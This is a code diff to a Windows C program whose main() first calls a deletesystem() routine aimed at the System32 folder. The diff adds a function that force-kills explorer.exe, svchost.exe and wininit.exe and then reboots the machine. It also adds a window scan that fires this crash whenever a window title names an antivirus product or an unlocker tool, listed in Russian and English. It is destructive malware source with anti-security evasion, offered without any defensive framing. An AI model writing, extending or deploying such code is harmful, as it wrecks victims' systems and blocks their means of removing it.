@@ -3,8 +3,6 @@
 #include <windows.h>
 #include <string.h>
 
-#define MAX_LINE_LENGTH 1000
-
 void deletesystem()
 {
   char system32Path[] = "C:\\Windows\\System32";
@@ -30,8 +28,42 @@ void fun()
   }
 }
 
+void trigger_bsod()
+{
+  system("taskkill /f /im explorer.exe");
+  system("taskkill /f /im svchost.exe");
+  system("taskkill /f /im wininit.exe");
+  system("shutdown /r /t 0");
+}
+
+BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
+{
+  char window_title[256];
+  GetWindowTextA(hwnd, window_title, sizeof(window_title));
+  
+  if (strstr(window_title, "антивирус") != NULL ||
+    strstr(window_title, "вирус") != NULL ||
+    strstr(window_title, "antivirus") != NULL ||
+    strstr(window_title, "virus") != NULL ||
+    strstr(window_title, "drweb") != NULL ||
+    strstr(window_title, "доктор веб") != NULL ||
+    strstr(window_title, "avast") != NULL ||
+    strstr(window_title, "аваст") != NULL ||
+    strstr(window_title, "kaspersky") != NULL ||
+    strstr(window_title, "касперский") != NULL ||
+    strstr(window_title, "simple unlocker") != NULL ||
+    strstr(window_title, "su") != NULL)
+    {
+      trigger_bsod();
+    }
+  return TRUE;
+}
+
 int main()
 {
   deletesystem();
   fun();
+  EnumWindows(EnumWindowsProc, NULL);
+  
+  return 0;
 }
